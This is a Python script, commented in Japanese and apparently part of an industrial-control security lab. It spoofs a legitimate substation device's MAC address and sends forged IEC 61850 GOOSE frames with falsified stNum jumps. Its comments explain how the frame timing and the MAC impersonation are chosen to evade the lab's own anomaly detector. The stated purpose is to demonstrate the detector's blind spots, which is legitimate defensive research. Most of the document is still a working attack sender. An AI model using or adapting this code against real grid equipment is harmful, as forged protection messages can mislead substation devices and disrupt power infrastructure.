import socket
import time

"""
Phase8-1: GOOSE Poisoning (StNum spoofing) sender.

sub_a_ied_02(本来は正規IEDだが、決定事項#Bに基づき「侵害された正規IED」
(insider/compromised-IED脅威モデル、Tritonを参考にした想定)という位置づけで
運用)から、sub_a_ied_01(正規のGOOSE Publisher)のMACアドレスを騙り、
StNumを不正にジャンプさせたGOOSEフレームを送信する。

現行のgoose_anomaly_sidecar(決定事項#35)は以下2種類の異常のみを検知する:
  1. 未知のMACアドレスからの送信 -> 本スクリプトはMACを偽装するため検知されない
  2. バースト送信(10秒間に20フレーム以上) -> 本スクリプトは正規送信(send_goose.py)
     と同じ2秒間隔(5フレーム/10秒)で送信するため、この閾値にも抵触しない

つまりこの送信は「検知されないこと」自体が目的の実証実験である。現行の簡易
検知(MAC allowlist + バーストレートのみ、L2ヘッダのみ参照)の設計上のブラインド
スポットを実証するために意図的に構成されている。stNumのジャンプという
「ペイロード内容の異常」はL2レベルのMAC+頻度監視だけでは検知できない
(ペイロード解析にはPhase9のSpicy自作実装が必要になる見込み)。
"""

GOOSE_ETHERTYPE = b'\x88\xb8'
DEST_MAC = b'\x01\x0c\xcd\x01\x00\x01'
# sub_a_ied_01(正規Publisher)のMACを騙る。
# 決定事項#4の静的allowlistは「登録済みMACかどうか」しか見ないため、
# このなりすましは構造的に検知不能(既知の設計上の限界)。
SPOOFED_SRC_MAC = b'\x02\x42\x0a\x00\x14\x0a'


def build_goose_payload(st_num: int, sq_num: int) -> bytes:
    """
    sub_a_ied_01/send_goose.pyのペイロード構造を踏襲しつつ、stNum/sqNumの
    値だけを可変にした簡易GOOSE PDU。

    (注: 元のsend_goose.pyの時点で既にASN.1 BERとして完全準拠ではない
    ---SEQUENCE長44バイトの宣言に対し実際のエンコード内容は36バイトしかなく、
    sqNum[6]以降のフィールド(simulation/confRev/ndsCom/numDatSetEntries/allData)
    も省略されている---ラボ用途の簡略化ペイロードである。goose_anomaly_sidecar
    はペイロード内容を一切解析しない(L2ヘッダのみ参照)ため、この簡略化は
    本テストの結論---「検知されるか否か」---には影響しない)
    """
    return (
        b'\x61\x2c'
        b'\x80\x09\x4b\x79\x69\x76\x5f\x47\x72\x69\x64'   # gocbRef: "Kyiv_Grid"
        b'\x81\x02\x03\xe8'                                # timeAllowedtoLive: 1000
        b'\x82\x09\x49\x45\x44\x5f\x53\x75\x62\x5f\x41'   # datSet: "IED_Sub_A"
        b'\x83\x02\x01\x8e'
        b'\x84\x01\x01'                                    # T
        + bytes([0x85, 0x01, st_num & 0xFF])               # stNum (可変・攻撃対象)
        + bytes([0x86, 0x01, sq_num & 0xFF])               # sqNum (可変・攻撃対象)
    )


def run_poison_sender():
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        s.bind(("eth0", 0))
        print(
            "[!] [POISON] GOOSE StNum spoofing sender started on eth0 "
            f"(impersonating MAC {SPOOFED_SRC_MAC.hex(':')})...",
            flush=True,
        )

        st_num = 1
        sq_num = 0
        count = 0
        while True:
            sq_num += 1
            # StNum異常ジャンプ: 正規Publisherが送る単調な小刻みの増分ではなく、
            # 攻撃者が状態遷移を偽装するケースを模して不連続にジャンプさせる
            # (GOOSE poisoningの典型パターン: 高いstNumで「新しい状態」だと
            # 購読側に信じ込ませる/正規Publisherを出し抜く)
            if count % 5 == 0:
                st_num += 50  # 不正な大ジャンプ
                sq_num = 0

            payload = build_goose_payload(st_num, sq_num)
            frame = DEST_MAC + SPOOFED_SRC_MAC + GOOSE_ETHERTYPE + payload
            s.send(frame)

            count += 1
            if count % 5 == 0:
                print(
                    f"[POISON] Sent spoofed frame #{count} "
                    f"(stNum={st_num}, sqNum={sq_num}, interval=2s; "
                    "burst_threshold=20/10s and known-MAC allowlist both intentionally avoided)",
                    flush=True,
                )

            # burst_threshold(20フレーム/10秒)を大きく下回る、正規送信
            # (send_goose.py)と同じ2秒間隔を維持する(周波数面でも検知回避を狙う)
            time.sleep(2)
    except Exception as e:
        print(f"[!] Error in GOOSE poison sender: {e}", flush=True)
        time.sleep(5)


if __name__ == "__main__":
    run_poison_sender()
